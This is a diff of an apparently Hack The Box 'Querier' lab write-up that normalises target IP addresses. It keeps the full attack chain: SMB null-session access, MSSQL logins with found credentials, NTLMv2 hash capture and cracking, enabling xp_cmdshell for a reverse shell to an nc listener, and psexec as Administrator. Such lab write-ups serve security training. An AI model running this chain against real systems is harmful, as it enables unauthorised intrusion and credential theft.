@@ -92,7 +92,7 @@ Examining the Nmap results we found the following open ports:
 One of the first things I do when finding SMB service accessible, is to try a null session to get access without credentials.
 We can try to list the available shares with the following command:
 ```shell
-smbclient -N -L //10.129.142.78
+smbclient -N -L //10.129.148.17
 ```
 We were successful. The command above gave us the following results:
 ```shell
@@ -105,7 +105,7 @@ Sharename       Type      Comment
 ```
 The Reports share looks quite suspicious. Let's examine it:
 ```shell
-smbclient -N //10.129.142.102/Reports
+smbclient -N //10.129.148.17/Reports
 ```
 Note: Restart the machine and try connecting to SMB again if we get any errors while connecting. If it doesnt get better, restart the VPN connection and Kali VM as well.
 
@@ -154,7 +154,7 @@ PcwTWTHRwryjc$c6
 We can use the following command to connect to MSSQL using the credentials we found:
 
 ```shell
-impacket-mssqlclient QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.129.142.102 -windows-auth
+impacket-mssqlclient QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.129.148.17 -windows-auth
 ```
 If we try to get a reverse shell using enable_xp_cmdshell, we will get an error telling us that we dont have permission to run it:
 
@@ -190,7 +190,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed
-[*] Incoming connection (10.129.187.241,49672)
+[*] Incoming connection (10.129.148.17,49672)
 [*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
 [*] User QUERIER\mssql-svc authenticated successfully
 [*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:b364144c5e0225835caf59af3e3692c6:0101000000000000009c45262032db0189802e0a5f0076070000000001001000430063006f004900740075007100440003001000430063006f00490074007500710044000200100046006d004100680071005100560070000400100046006d0041006800710051005600700007000800009c45262032db0106000400020000000800300030000000000000000000000000300000a626f9ce02155427672795a5f8ab247ebd02a0f91f075471202dfd8b17c5a35e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320030003600000000000000000000000000
@@ -237,7 +237,7 @@ hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt ha
 Now we can use the credentials of mssql-svc to access MSSQL:
 
 ```shell
-impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.187.241 -windows-auth
+impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.17 -windows-auth
 ```
 Enable xp_cmdshell entering the following 2 lines on the MSSQL shell, one at a time:
 
@@ -296,7 +296,7 @@ python3 -m http.server 8080
 nc -lvnp 8443
 
 # Close MSSQL shell and connect again
-impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.136 -windows-auth
+impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.17 -windows-auth
 
 # Enter the 4 lines on MSSQL shell
 EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -313,7 +313,7 @@ After running the commands above, we will get a response on our nc listener, giv
 
 ```shell
 listening on [any] 8443 ...
-connect to [10.10.14.206] from (UNKNOWN) [10.129.142.173] 49673
+connect to [10.10.14.206] from (UNKNOWN) [10.129.148.17] 49673
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -344,7 +344,7 @@ python3 -m http.server 8080
 # In case we lost access - Get access again
 nc -lvnp 8080
 
-impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.136 -windows-auth
+impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.17 -windows-auth
 
 EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
@@ -415,18 +415,18 @@ MyUnclesAreMarioAndLuigi!!1!
 We will try to get access as Administrator with impacket-psexec using the credentials we found:
 
 ```shell
-impacket-psexec Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.129.148.136
+impacket-psexec Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.129.148.17
 ```
 It worked! We successfully got access as Administrator:
 
 ```shell
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
-[*] Requesting shares on 10.129.148.136.....
+[*] Requesting shares on 10.129.148.17.....
 [*] Found writable share ADMIN$
 [*] Uploading file YlkMVUEt.exe
-[*] Opening SVCManager on 10.129.148.136.....
-[*] Creating service tUHD on 10.129.148.136.....
+[*] Opening SVCManager on 10.129.148.17.....
+[*] Creating service tUHD on 10.129.148.17.....
 [*] Starting service tUHD.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17763.292]
